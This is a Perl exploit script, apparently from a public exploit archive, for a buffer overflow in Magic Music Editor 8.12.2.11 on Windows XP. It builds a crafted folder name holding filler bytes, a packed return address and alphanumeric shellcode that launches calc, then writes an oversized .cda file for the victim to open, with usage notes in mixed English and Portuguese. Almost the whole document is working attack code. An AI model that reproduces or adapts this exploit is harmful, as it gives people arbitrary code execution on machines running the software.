#!/usr/bin/perl
#[+]Exploi Title: Exploit Buffer Overflow Magic Music Editor
#[+]Date: 03\01\2011
#[+]Author: C4SS!0 G0M3S
#[+]Software Link: http://www.magic-video-software.com/downloadserver/Magic-Music-Editor.exe
#[+]POC Found By: AtT4CKxT3rR0r1ST(http://www.exploit-db.com/exploits/16255/)
#[+]Version: 8.12.2.11
#[+]Tested on: WIN-XP SP3
#[+]CVE: N/A
#[+]Language: English
#
#Este exploit � Buffer Overflow q foi encontrado por AtT4CKxT3rR0r1ST(http://www.exploit-db.comexploits/16255/)
#
#Criado por C4SS!0 G0M3S
#E-mail Louredo_@hotmail.com
#Site www.x000.org
#How Use:
#
# For the exploit to work you put this file on drive C in the early C: \ exploit.pl
# Must be the address then click the exploit that creates a folder and either AAAAAAAA
# inside it will have the file open file.cda magic music editor open the file inside the folder
# THEN BOOM OPENS CALC
#
#Video: http://www.youtube.com/watch?v=T7KlxfNCy1o
#
#
print q{
 Author: C4SS!0 G0M3S
 E-mail: Louredo_@hotmail.com
 Site: www.x000.org/  
 };
 print "[+]Creating File fil3.cda...\n";
 sleep(2);
$buf = "\x41" x 25;
$buf .= pack('V',0x77207D33);
$buf .= TYIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJIP3O0PPU8SS3QBL3SF40XPPONDM15MVSLKON6A;#SHELLCODE WINEXEC CALC
 
mkdir($buf);
 
open(f,">c:\\$buf\\fil3.cda");
print f ("\x41" x 90000);
close